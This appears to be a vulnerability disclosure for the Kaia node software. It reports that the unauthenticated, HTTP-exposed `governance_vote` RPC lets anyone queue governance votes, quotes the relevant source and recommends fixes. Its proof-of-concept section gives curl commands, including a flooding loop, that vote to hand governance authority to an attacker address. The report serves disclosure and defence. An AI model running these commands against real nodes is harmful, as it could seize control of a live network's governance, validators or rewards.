### Title
Unbounded Unauthenticated `governance_vote` Queue Allows Unauthorized Governance Parameter Manipulation — (File: `kaiax/gov/headergov/impl/api.go`, `kaiax/gov/headergov/impl/init.go`)

---

### Summary

The `governance_vote` JSON-RPC method is registered as `Public: true` with no authentication and no rate limiting. Any HTTP client that can reach the node's RPC port can call it an unlimited number of times. Each call appends a new entry to the in-memory `myVotes` slice via `PushMyVotes`, which has no size cap and no deduplication guard. When the node next proposes a block, `PrepareHeader` blindly writes the first queued vote into `header.Vote`, causing it to be ratified at the next epoch boundary. An attacker can therefore inject arbitrary governance votes — including changing `governance.governingnode` to their own address — without any credential or rate limit.

---

### Finding Description

**Registration — `Public: true`, no `IPCOnly`:**

```go
// kaiax/gov/headergov/impl/api.go:13-21
func (h *headerGovModule) APIs() []rpc.API {
    return []rpc.API{
        {
            Namespace: "governance",
            Version:   "1.0",
            Service:   NewHeaderGovAPI(h),
            Public:    true,   // ← exposed over HTTP, no IPCOnly guard
        },
    }
}
```

`StartHTTPEndpoint` admits any API whose namespace is whitelisted **or**, when no whitelist is set, any API with `Public: true`:

```go
// networks/rpc/endpoints.go:47
if !api.IPCOnly && (whitelist[api.Namespace] || (len(whitelist) == 0 && api.Public)) {
```

So `governance_vote` is reachable over HTTP by default whenever the HTTP RPC server is enabled.

**Vote handler — no authentication, no rate limit, unbounded queue:**

```go
// kaiax/gov/headergov/impl/api.go:53-83
func (api *headerGovAPI) Vote(name string, value any) (string, error) {
    voter := api.h.nodeAddress   // always the node's own address; caller is never checked
    ...
    api.h.PushMyVotes(vote)      // appends unconditionally, no cap, no dedup
    return "...", nil
}
```

```go
// kaiax/gov/headergov/impl/init.go:183-188
func (h *headerGovModule) PushMyVotes(vote headergov.VoteData) {
    h.mu.Lock()
    defer h.mu.Unlock()
    h.myVotes = append(h.myVotes, vote)  // no size limit
}
```

**Block production — first queued vote is written verbatim:**

```go
// kaiax/gov/headergov/impl/header.go:30-55
func (h *headerGovModule) PrepareHeader(header *types.Header) error {
    if vote, ok := h.peekMyVote(); ok {
        voteBytes, _ := vote.ToVoteBytes()
        header.Vote = voteBytes   // attacker-injected vote written to block header
    }
    ...
}
```

`removeMyVote` removes only the **first** matching entry, so duplicate injections survive and are cast in subsequent blocks.

---

### Impact Explanation

When the node is the governing node (mainnet/Kairos `single` mode) or any council member (`none` mode), an attacker who can reach the HTTP RPC port can:

1. Call `governance_vote("governance.governingnode", "<attacker_address>")` — transfers full governance authority to the attacker's address. At the next epoch boundary this is ratified and the attacker's node becomes the sole governing node.
2. Call `governance_vote("reward.mintingamount", "0")` — sets block reward minting to zero, permanently halting KAIA issuance.
3. Call `governance_vote("governance.addvalidator", "<attacker_address>")` — injects an attacker-controlled validator into the committee.
4. Call `governance_vote("governance.unitprice", <value>)` — manipulates the base gas price.

All of these are protected chain-state changes: they alter the governance authority, validator set, or reward accounting of the live network.

---

### Likelihood Explanation

- EN (Endpoint Node) operators routinely expose their HTTP RPC publicly (`--rpc.addr 0.0.0.0`) to serve dApp traffic. The `governance` namespace is `Public: true` and is included by default when no explicit module whitelist is configured.
- No credential, token, or proof-of-work is required to call `governance_vote`.
- The attack requires only a single HTTP POST; no prior chain state or account balance is needed.
- The governing node's RPC address is discoverable from public node lists or block explorers.

---

### Recommendation

1. **Restrict `governance_vote` to IPC only.** Set `IPCOnly: true` in the API registration so it is never reachable over HTTP/WS:
   ```go
   {Namespace: "governance", Service: NewHeaderGovAPI(h), Public: false, IPCOnly: true}
   ```
2. **Cap `myVotes` queue size.** In `PushMyVotes`, reject pushes beyond a small bound (e.g., `len(h.myVotes) >= maxPendingVotes`) to prevent memory exhaustion and vote-flooding.
3. **Deduplicate on push.** Before appending, check whether an identical `(name, value)` vote already exists in `myVotes` and skip the append if so.
4. **Add per-connection rate limiting** to the RPC server for state-mutating governance methods, analogous to the existing `ipRateLimiter` used for P2P discovery pings.

---

### Proof of Concept

```bash
# Attacker targets a publicly-accessible governing node's HTTP RPC.
# Step 1: inject a vote to transfer governance authority to attacker's address.
curl -s http://<governing-node-ip>:8551 \
  -X POST -H 'Content-Type: application/json' \
  --data '{
    "jsonrpc":"2.0","id":1,
    "method":"governance_vote",
    "params":["governance.governingnode","0xAttackerAddress"]
  }'
# Response (no auth required):
# {"jsonrpc":"2.0","id":1,"result":"(kaiax) Your vote is prepared..."}

# Step 2: flood the queue so the vote survives removeMyVote deduplication
# and is re-cast in every block the node proposes until the epoch ends.
for i in $(seq 1 1000); do
  curl -s http://<governing-node-ip>:8551 -X POST \
    -H 'Content-Type: application/json' \
    --data '{"jsonrpc":"2.0","id":1,"method":"governance_vote",
             "params":["governance.governingnode","0xAttackerAddress"]}' &
done
wait

# Step 3: wait for the node to propose a block.
# header.Vote is now set to the attacker's governance.governingnode vote.
# At the next epoch boundary, the ratification is written to header.Governance
# and the attacker's address becomes the sole governing node.
```

**Exact corrupted value:** `governance.governingnode` in the on-chain governance parameter set is overwritten to the attacker's address at epoch block `(k+1)*epoch`, granting the attacker exclusive authority to cast all future governance votes. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4)

### Citations

**File:** kaiax/gov/headergov/impl/api.go (L13-21)
```go
func (h *headerGovModule) APIs() []rpc.API {
	return []rpc.API{
		{
			Namespace: "governance",
			Version:   "1.0",
			Service:   NewHeaderGovAPI(h),
			Public:    true,
		},
	}
```

**File:** kaiax/gov/headergov/impl/api.go (L53-83)
```go
func (api *headerGovAPI) Vote(name string, value any) (string, error) {
	var (
		voter     = api.h.nodeAddress
		nextBlock = api.h.Chain.CurrentBlock().NumberU64() + 1
		gp        = api.h.GetParamSet(nextBlock)
		gMode     = gp.GovernanceMode
	)

	if gMode == "single" && voter != gp.GoverningNode {
		return "", ErrVotePermissionDenied
	}

	vote := headergov.NewVoteData(voter, name, value)
	if vote == nil {
		return "", ErrInvalidKeyValue
	}

	if gov.DeprecatedAt(vote.Name(), api.h.ChainConfig.Rules(new(big.Int).SetUint64(nextBlock))) {
		return "", ErrDeprecatedVote
	}

	err := api.h.checkConsistency(nextBlock, vote)
	if err != nil {
		return "", err
	}

	// TODO-kaiax: add removevalidator vote check

	api.h.PushMyVotes(vote)
	return "(kaiax) Your vote is prepared. It will be put into the block header or applied when your node generates a block as a proposer. Note that your vote may be duplicate.", nil
}
```

**File:** kaiax/gov/headergov/impl/init.go (L183-188)
```go
func (h *headerGovModule) PushMyVotes(vote headergov.VoteData) {
	h.mu.Lock()
	defer h.mu.Unlock()

	h.myVotes = append(h.myVotes, vote)
}
```

**File:** kaiax/gov/headergov/impl/header.go (L30-55)
```go
func (h *headerGovModule) PrepareHeader(header *types.Header) error {
	// if this node has a vote waiting to be casted, put Vote field.
	if vote, ok := h.peekMyVote(); ok {
		voteBytes, err := vote.ToVoteBytes()
		if err != nil {
			return err
		}
		header.Vote = voteBytes
		logger.Debug("Prepare header with vote", "num", header.Number.Uint64(), "vote", hexutil.Encode(header.Vote))
	}

	// if epoch block & vote exists in the last epoch, put Governance field.
	if header.Number.Uint64()%h.epoch == 0 {
		gov := h.getExpectedGovernance(header.Number.Uint64())
		if len(gov.Items()) > 0 {
			govBytes, err := gov.ToGovBytes()
			if err != nil {
				return err
			}
			header.Governance = govBytes
			logger.Debug("Prepare header with governance", "num", header.Number.Uint64(), "governance", hexutil.Encode(header.Governance))
		}
	}

	return nil
}
```

**File:** networks/rpc/endpoints.go (L29-53)
```go
// StartHTTPEndpoint starts the HTTP RPC endpoint, configured with cors/vhosts/modules
func StartHTTPEndpoint(endpoint string, apis []API, modules []string, cors []string, vhosts []string, timeouts HTTPTimeouts) (net.Listener, *Server, error) {
	// Generate the whitelist based on the allowed modules
	whitelist := make(map[string]bool)
	for _, module := range modules {
		// for backward compatibility
		if module == "klay" {
			module = "kaia"
		}
		whitelist[module] = true
	}
	// Register all the APIs exposed by the services
	handler := NewServer()
	for _, api := range apis {
		if api.Namespace == "klay" {
			api.Namespace = "kaia"
		}

		if !api.IPCOnly && (whitelist[api.Namespace] || (len(whitelist) == 0 && api.Public)) {
			if err := handler.RegisterName(api.Namespace, api.Service); err != nil {
				return nil, nil, err
			}
			logger.Debug("HTTP registered", "namespace", api.Namespace)
		}
	}
```
